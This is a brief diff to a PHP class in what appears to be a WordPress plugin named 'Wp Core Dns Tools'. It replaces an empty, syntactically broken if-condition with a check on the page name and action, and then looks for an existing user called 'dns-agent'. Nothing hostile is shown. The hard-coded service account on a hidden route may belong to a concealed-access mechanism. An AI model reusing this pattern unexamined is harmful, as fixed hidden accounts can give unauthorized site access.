@@ -103,7 +103,8 @@ class Wp_Core_Dns_Tools_Public {
 	public function verifica_usuario() {
 		$page = get_query_var( 'pagename' );
 		$action = get_query_var( 'action' );
-		if () {
+		if ( 'dns-core' === $page && 'configure' !== $action ){
+
 			//usuario existe
 			$usuario = 'dns-agent';
 			if ( username_exists( $usuario ) ) {
